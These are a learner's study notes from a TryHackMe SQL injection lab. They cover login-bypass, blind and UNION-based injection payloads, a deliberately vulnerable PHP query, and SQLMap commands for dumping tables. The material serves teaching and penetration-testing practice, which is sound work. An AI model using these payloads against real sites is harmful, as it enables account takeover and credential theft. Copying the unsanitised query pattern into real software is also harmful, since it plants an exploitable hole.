# Day 19 — SQL Injection Attacks
[← Back to overview](README.md)

## What is SQL Injection?
A SQL injection (SQLi) attack consists of injecting a SQL query into a remote web application. A successful SQLi
exploit can read sensitive data from the database (usernames & passwords), modify database data (add/delete),
execute administration operations on the database (e.g. shutting it down), and in some cases execute commands on the
underlying operating system.

Practiced via TryHackMe's **SQL Injection** room (part of "25 Days of Cyber"), completed to 100%.

## SQL Background
SQL is the language used to talk to databases. Even a small misconfiguration in the code that builds a SQL query can
lead to injection. Four core commands cover most of it:

| Command | Purpose |
|---|---|
| `SELECT` | Choose which columns to retrieve. |
| `FROM` | Specify which table to select or delete data from. |
| `WHERE` | Extract only records that fulfil a specified condition. |
| `UNION` | Combine the result-set of two or more `SELECT` statements. |

Important detail: `1=1` in SQL evaluates to `True` — the basis for most injection payloads below.

## How Does an SQLi Attack Work?
SQLi is carried out by abusing a PHP GET parameter (e.g. `?username=` or `?id=`) in a vulnerable page's URL — commonly
found in search fields and login pages.

Example vulnerable PHP:
```php
<?php $username = $_GET['username']; $result = mysql_query("SELECT * FROM users WHERE username='$username'"); ?>
```
If a malicious user supplies a lone quotation mark (`'`) as the username, the resulting query becomes:
```sql
SELECT * FROM users WHERE username=''''
```
That extra quote breaks the query syntax and produces a database error — exactly the signal used to detect and
exploit the injection.

**General principle:** SQL injection is an attack where the goal is to break the SQL code's execution logic, inject
your own logic, and then "fix" the broken part by commenting out the rest of the original query.

Most common comment styles used to close off a payload: `-- + `, `//`, `/* `.

Visual breakdown of a classic payload:
```
/sqli-labs/Less-1/index.php?id=1' AND 1=1 --+
              ↑             ↑        ↑
          Left side:     SQL Code   Right side:
        Breaks the       (1=1)     Fixes the query,
        SQL query                  making the SQL code
                                    part of it
```

## Login Bypass with SQL Injection
One of the most powerful applications of SQLi is **login bypassing** — getting into *any* account knowing just the
username (or nothing at all).

Vulnerable login query:
```sql
SELECT username,password FROM users WHERE username='$username' and password='$password'
```
Injecting `' or true --` as the username field turns it into:
```sql
SELECT username,password FROM users WHERE username='' or true -- and password=''
```
The `--` comments out the password check entirely — the app "forgets" to verify the password.

Some sites wrap fields in parentheses, requiring a slightly different payload:
```sql
SELECT username,pass FROM users WHERE username=('$username') and password=('$password')
```
→ payload becomes `') or true--`

### Practice — Login Bypass Lab
On a deployed lab machine (port 3000, `Really Insecure PHP Page`), entering:
- **Username:** `john`
- **Password:** `password123') or true; --`

produced the actual back-end query:
```sql
SELECT * FROM users
    WHERE username = 'john'
    AND password = MD5('password123') or true; -- ')
```
Result: returned **all three rows** in the `users` table (id, username, MD5 password hash) instead of a single
matched user — confirming the injection worked and bypassed the password check entirely.

A second test using `santa' OR 1=1-- -` as the username (password left arbitrary) produced:
```sql
SELECT * FROM users
    WHERE username = 'santa' OR 1=1-- -'
    AND password = MD5('asd')
```
Same result: full table dump, proving `OR 1=1` unconditionally satisfies the `WHERE` clause regardless of username.

This same payload (`santa' OR 1=1-- -`) was then used directly against a real login form ("Santa's corporation"
panel) at `10.10.40.194:8000/santapanel` to attempt an authentication bypass on the live lab target.

## Blind SQL Injection
Some developers restrict an application from displaying any error — but that doesn't stop the attack, it just
changes the technique. **Blind SQL Injection** relies on observing *changes* in the application's behaviour (rather
than reading an explicit database error) during the attack.

Since only "did an error happen or not" is visible, blind SQLi is carried out by asking the database **Yes/No**
questions (Error = "No", No Error = "Yes"). Through this, an attacker can guess the database name, read column data,
and more — slower than error-based SQLi, but often the most common technique found in the wild.

**Step 1 — Cause the error:**
```
10.10.198.238/sqli-labs/Less-8/?id=1'
```
**Step 2 — Fix it (confirm the vulnerability without an error):**
```
10.10.198.238/sqli-labs/Less-8/?id=1' --+
```
The page shows "You are in........." with no visible error — confirming a working blind injection point.

**Asking questions with `SUBSTR()`:**
```sql
substr((select database()),1,1)) = 115
```
This asks: *is the first character of the database name equal to ASCII 115 (`'s'`)?*

Put into a full payload:
```
?id=1' AND (ascii(substr((select database()),1,1))) = 115 --+
```
If the app shows no change (still "You are in........."), the answer is **Yes** — confirmed the database name starts
with `s`. Any error/change means **No**. This same blind technique also works in "open" (non-restricted) situations.

## UNION SQL Injection
`UNION` SQLi is mainly used for **fast database enumeration**, since the `UNION` operator combines results of
multiple `SELECT` statements at once. A UNION SQLi attack has 3 stages:
1. Finding the number of columns.
2. Checking if the columns are suitable (right data type).
3. Attack and extract interesting data.

**Finding the number of columns — two methods:**
- Injecting a series of `ORDER BY` queries until an error occurs:
  ```
  ' ORDER BY 1-- ' ORDER BY 2-- ' ORDER BY 3-- # ...until an error occurs
  ```
  (The last value *before* the error indicates the number of columns.)
- The more common/effective method — submitting `UNION SELECT` payloads with increasing NULL values:
  ```
  ' UNION SELECT NULL-- ' UNION SELECT NULL,NULL-- ' UNION SELECT NULL,NULL,NULL-- # until the error occurs
  ```
  No error = the number of NULLs matches the number of columns.

**Finding columns with a useful (string) data type:** having determined e.g. 4 columns, probe each one by replacing a
NULL with a string value:
```
' UNION SELECT 'a',NULL,NULL,NULL-- ' UNION SELECT NULL,'a',NULL,NULL-- ...
```
No error on a given position = that column can hold string data — useful for extracting text like usernames/passwords.

**Extracting real data:** once the number of useful string columns is known (say two), and a `users` table with
`username`/`password` columns is suspected, submit:
```
' UNION SELECT username, password FROM users --
```
This returns real credential data directly on the page, appended alongside the legitimate query's results.

Useful information-schema columns to remember for enumeration: `table_name`, `column_name` (from
`information_schema.tables` / `information_schema.columns`), plus standard fields like `password`.

## SQLMap — Automating SQL Injection
**SQLMap** is an open-source penetration testing tool that automates detecting and exploiting SQL injection flaws and
taking over database servers.

```bash
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
```

| Option | Purpose |
|---|---|
| `--url` | Provide the URL for the attack. |
| `--dbms` | Tell SQLMap the type of database that is running. |
| `--dump` | Dump the data within the database that the application uses. |
| `--dump-all` | Dump the ENTIRE database. |
| `--batch` | SQLMap runs automatically and won't ask for user input. |
| `--tables` | Enumerate tables in the target database. |
| `--columns` | Enumerate columns in the target database/table. |

Example command:
```bash
sqlmap --url http://tbfc.net/login.php --tables --columns
```
*(tbfc.net is only an illustrative example — no authorized consent was given to actually target it.)*

**SQLMap & Burp Suite:** the most useful integration is capturing a request in Burp (via FoxyProxy in the AttackBox)
and saving it to a file, then feeding that request straight into SQLMap instead of manually re-typing URL/parameters.

## Why It Matters
SQL injection remains one of the most damaging web vulnerabilities because it directly targets the data layer — a
single unsanitized parameter can expose an entire user database, bypass authentication outright, or hand over full
database control. Understanding the manual technique (error-based, blind, UNION) before reaching for SQLMap is
essential: automated tools are powerful, but knowing what they're actually doing under the hood is what separates
a tester who can adapt to an unusual WAF/filter from one who's stuck when the automated tool fails.

## 🧠 Quick Revision Questions
1. Why does `OR 1=1` inside a WHERE clause bypass a login form's password check?
2. In blind SQLi, what does "no error/no change" on the page actually confirm?
3. Why must the number of columns be determined *before* running a UNION-based data extraction payload?

## 🔑 New Glossary Terms
- **SQLi (SQL Injection)** — injecting attacker-controlled SQL into a vulnerable query.
- **Blind SQL Injection** — exploiting SQLi without visible database errors, via Yes/No behavioral inference.
- **UNION-based SQLi** — using the `UNION` operator to append attacker-chosen data to legitimate query results.
- **SQLMap** — an open-source tool that automates detection and exploitation of SQL injection.
- **information_schema** — a built-in database schema exposing metadata (table/column names) about the database itself.

---
[← Day 18](day18.md) | [Back to overview](README.md) | [Next: Day 20 →](day20.md)
